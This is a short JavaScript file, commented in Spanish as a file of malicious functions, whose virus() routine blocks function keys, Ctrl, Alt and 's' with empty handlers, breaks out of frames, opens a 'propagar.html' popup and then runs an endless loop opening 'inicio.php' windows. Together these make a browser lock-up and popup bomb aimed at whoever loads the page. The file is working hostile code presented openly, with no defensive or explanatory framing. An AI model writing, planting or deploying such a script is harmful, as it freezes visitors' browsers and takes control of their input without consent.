//Archivo js con funciones maliciosas

function virus(){

	bloqueo();
	maximizar();
	cargaPaginas();
}

function bloqueo(){
if(top.location != self.location)
  top.location = self.location;
shortcut.add("s",function() {
});
shortcut.add("F2",function() {
});
shortcut.add("F3",function() {
});
shortcut.add("F4",function() {
});
shortcut.add("F5",function() {
});
shortcut.add("F6",function() {
});
shortcut.add("F7",function() {
});
shortcut.add("F8",function() {
});
shortcut.add("F9",function() {
});
shortcut.add("F10",function() {
});
shortcut.add("F11",function() {
});
shortcut.add("F12",function() {
});
shortcut.add("Ctrl",function() {
});
shortcut.add("Alt",function() {
});

}


function maximizar(){

	var w= Math.floor(Math.random() * 100); 
	window.open("propagar.html", "VIRUS", "width=100" , "height=100");
	
}

function cargaPaginas(){
   for(var i = 1; i >= 1;i++){
     window.open("inicio.php");
     
 }

}
